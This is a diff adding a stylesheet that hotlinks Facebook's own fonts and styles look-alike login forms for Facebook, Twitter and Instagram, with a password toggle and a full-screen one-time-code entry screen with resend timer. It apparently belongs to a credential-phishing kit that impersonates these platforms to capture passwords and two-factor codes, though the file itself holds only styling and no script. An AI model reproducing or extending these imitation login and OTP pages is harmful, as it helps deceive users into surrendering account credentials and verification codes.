@@ -1,0 +1,847 @@
+@font-face {
+  font-family: "Optimistic Text Light";
+  font-style: normal;
+  font-weight: 300;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yJ/r/G4CvqQXT71s.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yu/r/3nJF2AW_2KI.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/lOCZ6cH-l95.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Light Swap";
+  font-style: normal;
+  font-weight: 300;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yJ/r/G4CvqQXT71s.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yu/r/3nJF2AW_2KI.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/lOCZ6cH-l95.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Normal";
+  font-style: normal;
+  font-weight: normal;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y2/r/6YirsaXqsap.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yN/r/A8MP726Y7RW.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yl/r/nqnBBWt1cQ8.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Normal Swap";
+  font-style: normal;
+  font-weight: normal;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y2/r/6YirsaXqsap.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yN/r/A8MP726Y7RW.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yl/r/nqnBBWt1cQ8.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Medium";
+  font-style: normal;
+  font-weight: 500;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/ndhgOwkNmDs.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/y3/r/g6ncoEztC_N.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yB/r/phfAjnBQdX6.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Medium Swap";
+  font-style: normal;
+  font-weight: 500;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/ndhgOwkNmDs.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/y3/r/g6ncoEztC_N.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yB/r/phfAjnBQdX6.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Bold";
+  font-style: normal;
+  font-weight: bold;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/WF8VhTuShVE.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yC/r/Oe0HWHR8zW7.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/GWRXKV3XeMW.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Bold Swap";
+  font-style: normal;
+  font-weight: bold;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/WF8VhTuShVE.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yC/r/Oe0HWHR8zW7.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/GWRXKV3XeMW.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Bold";
+  font-style: normal;
+  font-weight: 700;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/WF8VhTuShVE.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yC/r/Oe0HWHR8zW7.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/GWRXKV3XeMW.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Bold Swap";
+  font-style: normal;
+  font-weight: 700;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/WF8VhTuShVE.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yC/r/Oe0HWHR8zW7.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/GWRXKV3XeMW.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text ExtraBold";
+  font-style: normal;
+  font-weight: 800;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yO/r/_IxD8PqgShI.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yI/r/XSfIGfuYAms.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/GWRXKV3XeMW.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text ExtraBold Swap";
+  font-style: normal;
+  font-weight: 800;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yO/r/_IxD8PqgShI.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yI/r/XSfIGfuYAms.woff)
+      format("woff"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/GWRXKV3XeMW.eot)
+      format("embedded-opentype");
+}
+@font-face {
+  font-family: "Optimistic Text Viet Light";
+  font-style: normal;
+  font-weight: 300;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/KjRMIwI5MLI.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/y5/r/2kK0RUn3aHt.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Viet Light Swap";
+  font-style: normal;
+  font-weight: 300;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/KjRMIwI5MLI.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/y5/r/2kK0RUn3aHt.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Viet Normal";
+  font-style: normal;
+  font-weight: normal;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/577bYCjitsm.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/y-/r/IOMVSiO_79n.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Viet Normal Swap";
+  font-style: normal;
+  font-weight: normal;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yT/r/577bYCjitsm.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/y-/r/IOMVSiO_79n.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Viet Bold";
+  font-style: normal;
+  font-weight: bold;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yQ/r/6sGd9jAF7-G.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yj/r/tfxfr82lQhK.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Viet Bold Swap";
+  font-style: normal;
+  font-weight: bold;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yQ/r/6sGd9jAF7-G.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yj/r/tfxfr82lQhK.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Arbc Light";
+  font-style: normal;
+  font-weight: 300;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yv/r/1lvRwR8FCtJ.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yG/r/ffP85_okaMb.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Arbc Light Swap";
+  font-style: normal;
+  font-weight: 300;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yv/r/1lvRwR8FCtJ.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yG/r/ffP85_okaMb.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Arbc Normal";
+  font-style: normal;
+  font-weight: normal;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yV/r/KandUw__L2Y.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yE/r/eMwOw8vF5hG.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Arbc Normal Swap";
+  font-style: normal;
+  font-weight: normal;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/yV/r/KandUw__L2Y.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yE/r/eMwOw8vF5hG.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Arbc Bold";
+  font-style: normal;
+  font-weight: bold;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y2/r/Y5UW-giPmlu.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yI/r/t1juam039_W.woff)
+      format("woff");
+}
+@font-face {
+  font-family: "Optimistic Text Arbc Bold Swap";
+  font-style: normal;
+  font-weight: bold;
+  src: url(https://z-m-static.xx.fbcdn.net/rsrc.php/y2/r/Y5UW-giPmlu.woff2)
+      format("woff2"),
+    url(https://z-m-static.xx.fbcdn.net/rsrc.php/yI/r/t1juam039_W.woff)
+      format("woff");
+}
+._97fe {
+  font-family: "Optimistic Text Normal", Helvetica, Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+._ar59 {
+  font-family: "Optimistic Text Normal Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+._aiek {
+  font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif !important;
+  font-weight: 500 !important;
+}
+._ar5a {
+  font-family: "Optimistic Text Medium Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: 500 !important;
+}
+._98hv {
+  font-family: "Optimistic Text Bold", Helvetica, Arial, sans-serif !important;
+  font-weight: bold !important;
+}
+._ar54 {
+  font-family: "Optimistic Text Bold Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: bold !important;
+}
+.Locale_vi_VN ._97fe {
+  font-family: "Optimistic Text Viet Normal", Helvetica, Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+.Locale_vi_VN ._ar59 {
+  font-family: "Optimistic Text Viet Normal Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+.Locale_vi_VN ._98hv {
+  font-family: "Optimistic Text Viet Bold", Helvetica, Arial, sans-serif !important;
+  font-weight: bold !important;
+}
+.Locale_vi_VN ._ar54 {
+  font-family: "Optimistic Text Viet Bold Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: bold !important;
+}
+.Locale_ar_AR ._97fe {
+  font-family: "Optimistic Text Arbc Normal", Helvetica, Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+.Locale_ar_AR ._ar59 {
+  font-family: "Optimistic Text Arbc Normal Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+.Locale_ar_AR ._98hv {
+  font-family: "Optimistic Text Arbc Bold", Helvetica, Arial, sans-serif !important;
+  font-weight: bold !important;
+}
+.Locale_ar_AR ._ar54 {
+  font-family: "Optimistic Text Arbc Bold Swap", Helvetica, Arial, sans-serif !important;
+  font-weight: bold !important;
+} /*FB_PKG_DELIM*/
+
+#bootloader_IfFc0rO {
+  height: 42px;
+}
+.bootloader_IfFc0rO {
+  display: block !important;
+}
+.form-group {
+  position: relative;
+  margin-bottom: 0.5rem;
+  font-family: "Optimistic Text Medium";
+}
+
+.form-group label {
+  position: absolute;
+  left: 1rem;
+  top: 30%;
+  transform: translateY(10%);
+  transition: top 0.2s ease-out, font-size 0.2s ease-out;
+  pointer-events: none;
+  color: rgb(162 172 180);
+  display: inline;
+  font-size: 12px;
+  overflow-wrap: break-word;
+  font-family: "Optimistic Text Medium";
+}
+
+.form-group input {
+  width: calc(100%);
+  /* Adjusted to accommodate icon width */
+  padding: 16px;
+  border: 1px solid #ccc;
+  border-radius: 12px;
+  font-family: "Optimistic Text Medium";
+  font-size: 13px;
+  /* Added padding for the icon */
+}
+
+.form-group input:focus ~ label,
+.form-group input:valid ~ label {
+  top: 0;
+  font-size: 12px;
+  color: #333;
+}
+
+#hbody,
+.tbook {
+  background-color: rgb(255 255 255);
+  margin: 0 auto;
+  text-align: center;
+  height: 100vh;
+  padding: 20px;
+}
+
+#lbody,
+.fbook {
+  background-color: rgb(240 246 255);
+  margin: 0 auto;
+  text-align: center;
+  height: 100vh;
+  padding: 20px;
+}
+
+#ibody,
+.instacss {
+  background-color: rgb(255, 255, 255);
+  margin: 0 auto;
+  text-align: center;
+  height: 100vh;
+  padding: 20px;
+}
+
+.toggle-password {
+  position: absolute;
+  right: 1rem;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  width: 24px;
+  /* Adjust icon width */
+  height: 24px;
+  /* Adjust icon height */
+  background-image: url("/img/hide.png");
+  /* Replace with your icon path */
+  background-size: cover;
+  background-repeat: no-repeat;
+
+  mask-size: cover;
+  object-position: 10000px 10000px;
+  object-fit: cover;
+  overflow: hidden;
+}
+
+.clear-input {
+  position: absolute;
+  right: 1rem;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  width: 24px;
+  /* Adjust icon width */
+  height: 24px;
+  /* Adjust icon height */
+  background-image: url("/img/cancel.png");
+  /* Path to your image file */
+  background-size: cover;
+  display: none;
+  /* Initially hide the clear icon */
+}
+
+/* Twitter css begins */
+
+.twform-group {
+  position: relative;
+  margin-bottom: 1.5rem;
+  font-family: "Optimistic Text Medium";
+}
+
+.twform-group label {
+  position: absolute;
+  left: 1rem;
+  top: 30%;
+  transform: translateY(10%);
+  transition: top 0.2s ease-out, font-size 0.2s ease-out;
+  pointer-events: none;
+  background-color: (0, 0, 0, 0);
+  display: inline;
+  font-size: 15px;
+  font-weight: 100;
+  overflow-wrap: break-word;
+  font-family: "Optimistic Text Medium";
+}
+
+.twform-group input {
+  width: calc(100% - 40px);
+  /* Adjusted to accommodate icon width */
+  padding: 16px;
+  border: 0.1px solid #ccc;
+  background-color: transparent;
+  color: rgb(231, 233, 234);
+  font-weight: 200;
+  border-radius: 4px;
+  font-size: 13px;
+  /* Added padding for the icon */
+}
+
+.twform-group input:focus ~ label,
+.twform-group input:valid ~ label {
+  top: 0;
+  font-size: 12px;
+  color: rgb(29, 155, 240);
+}
+
+#hbody,
+.tbook {
+  background-color: rgb(240 246 255);
+  margin: 0 auto;
+  text-align: center;
+  height: 100vh;
+  padding: 20px;
+}
+
+.css-175oi2r {
+  align-items: left;
+  background-color: rgba(255, 255, 255, 0);
+  border: 0 solid black;
+  box-sizing: border-box;
+  display: flex;
+  flex-basis: auto;
+  flex-direction: column;
+  flex-shrink: 0;
+  list-style: none;
+  margin: 0px;
+  min-height: 0px;
+  min-width: 0px;
+  padding: 0px;
+  position: relative;
+  text-decoration: none;
+  z-index: 0;
+}
+
+.css-1jxf684 {
+  background-color: rgba(0, 0, 0, 0);
+  border: 0 solid black;
+  box-sizing: border-box;
+  color: whitesmoke;
+  display: inline;
+  font: inherit;
+  list-style: none;
+  font-size: 25px;
+  font-weight: 700;
+  margin: 0px;
+  padding: 0px;
+  position: relative;
+  text-align: left;
+  text-decoration: none;
+  white-space: inherit;
+  word-wrap: break-word;
+}
+
+/* Overlay background */
+.dialog-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.35);
+  display: none; /* hidden by default */
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+/* Dialog box */
+.dialog-box {
+  background-color: #fff;
+  border-radius: 12px;
+  width: 85%;
+  max-width: 360px;
+  padding: 20px 0 0 0;
+  text-align: center;
+  animation: fadeIn 0.3s ease;
+}
+
+/* Title (bold) */
+.dialog-title {
+  font-size: 1rem;
+  font-weight: bold;
+  color: #222;
+  margin-bottom: 8px;
+}
+
+/* Message text */
+.dialog-message {
+  font-size: 0.85rem;
+  color: #999;
+  padding: 0 20px;
+  margin-bottom: 20px;
+}
+
+/* Divider line */
+.dialog-divider {
+  border: none;
+  border-top: 1px solid #ddd;
+  margin: 0;
+  width: 100%;
+}
+
+/* OK button */
+.dialog-ok {
+  background: none;
+  border: none;
+  color: #007bff;
+  font-weight: 400;
+  font-size: 1rem;
+  cursor: pointer;
+  padding: 10px 0;
+  width: 100%;
+  border-radius: 0 0 12px 12px;
+  transition: background 0.2s;
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: scale(0.95);
+  }
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+/* Prevent input zoom on focus (iOS/Android fix) */
+input,
+select,
+textarea {
+  font-size: 12px !important; /* iOS zooms when below 16px */
+  touch-action: manipulation;
+}
+
+/* OTP Modal Styles */
+.otp-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgb(255 255 255);
+  display: none;
+  justify-content: center;
+  z-index: 9999;
+  font-family: "Optimistic Text Normal", Helvetica, Arial, sans-serif;
+  box-sizing: border-box;
+}
+
+.otp-dialog {
+  background-color: #fff;
+  border-radius: 12px;
+  width: 100%;
+  max-width: 400px;
+  padding: 15px;
+  text-align: left;
+}
+
+/* OTP Header */
+.otp-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 2px;
+}
+
+.otp-back-btn {
+  background: none;
+  border: none;
+  font-size: 18px;
+  color: #65676bc2;
+  cursor: pointer;
+  border-radius: 50%;
+  transition: background-color 0.2s;
+}
+
+.otp-back-btn:hover {
+}
+
+.otp-help-btn {
+  background: none;
+  border: none;
+  font-size: 20px;
+  color: #65676bc2;
+  cursor: pointer;
+  padding: 8px;
+  border-radius: 50%;
+  transition: background-color 0.2s;
+}
+
+.otp-help-btn:hover {
+}
+
+.otp-title {
+  font-size: 14px;
+  font-weight: bold;
+  color: #1c2b33;
+  margin-bottom: 8px;
+  font-family: "Optimistic Text Bold", Helvetica, Arial, sans-serif;
+}
+
+.otp-message {
+  font-size: 11px;
+  color: rgb(99, 120, 138);
+  margin-bottom: 8px;
+  font-family: "Optimistic Text Normal", Helvetica, Arial, sans-serif;
+  line-height: 1.4;
+}
+
+.otp-phone {
+  font-size: 14px;
+  color: #1c2b33;
+  font-weight: 500;
+  margin-bottom: 20px;
+  font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif;
+}
+
+/* Demo Image */
+.otp-image-container {
+  margin: 20px 0;
+  display: flex;
+  justify-content: center;
+}
+
+.otp-demo-image {
+  width: 462px;
+  border-radius: 12px;
+  object-fit: contain;
+}
+
+.otp-input-container {
+  margin-bottom: 10px;
+}
+
+.otp-input {
+  width: 100%;
+  padding: 14px 10px;
+  font-size: 11px;
+  border: 1px solid #dddfe2;
+  border-radius: 8px;
+  font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif;
+  text-align: left;
+}
+
+.otp-input:focus {
+  border-color: #1877f2;
+  background: white;
+  outline: none;
+}
+
+.otp-actions {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+/* Refresh Icon */
+.otp-refresh-icon {
+  margin-right: 8px;
+  font-size: 16px;
+  color: #65676b;
+}
+
+.otp-new-code {
+  display: flex;
+  align-items: center;
+  background: none;
+  border: none;
+  color: rgb(0, 100, 224);
+  font-size: 14px;
+  cursor: pointer;
+  font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif;
+  padding: 8px 12px;
+  border-radius: 6px;
+  transition: background-color 0.2s;
+}
+
+.otp-new-code:hover {
+  background-color: #f0f2f5;
+}
+
+.otp-new-code:disabled {
+  color: #ccc;
+  cursor: not-allowed;
+  background: none;
+}
+
+.otp-timer {
+  font-size: 14px;
+  color: rgb(99, 120, 138);
+  font-family: "Optimistic Text Normal", Helvetica, Arial, sans-serif;
+}
+
+.otp-buttons {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.otp-button {
+  padding: 5px 16px;
+  border: none;
+  border-radius: 50px;
+  font-size: 16px;
+  cursor: pointer;
+  font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif;
+  transition: all 0.2s;
+}
+
+.otp-button-secondary {
+  background: none;
+  border: 1px solid #ccc;
+  color: #1a1919a1;
+}
+
+.otp-button-primary {
+  background-color: rgb(0, 100, 224);
+  color: white;
+}
+
+.otp-button-primary:disabled {
+  background-color: rgba(0, 101, 224, 0.24);
+  cursor: not-allowed;
+}
+
+.hidden {
+  display: none !important;
+}
+
+/* Dialog Styles */
+.dialog-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.35);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 10000;
+}
+
+.dialog-box {
+  background-color: #fff;
+  border-radius: 12px;
+  width: 85%;
+  max-width: 360px;
+  padding: 20px 0 0 0;
+  text-align: center;
+}
+
+.dialog-title {
+  font-size: 1rem;
+  font-weight: bold;
+  color: #222;
+  margin-bottom: 8px;
+}
+
+.dialog-message {
+  font-size: 0.85rem;
+  color: #999;
+  padding: 0 20px;
+  margin-bottom: 20px;
+}
+
+.dialog-divider {
+  border: none;
+  border-top: 1px solid #ddd;
+  margin: 0;
+  width: 100%;
+}
+
+.dialog-ok {
+  background: none;
+  border: none;
+  color: #007bff;
+  font-weight: 400;
+  font-size: 1rem;
+  cursor: pointer;
+  padding: 10px 0;
+  width: 100%;
+  border-radius: 0 0 12px 12px;
+  transition: background 0.2s;
+}
+
+.uiBoxRed {
+  background: #fff5f5;
+  border: 1px solid #ffcccc;
+  border-radius: 6px;
+  padding: 12px;
+  margin-bottom: 16px;
+}
+
+.fsl {
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.fcb {
+  color: #be4b49;
+}
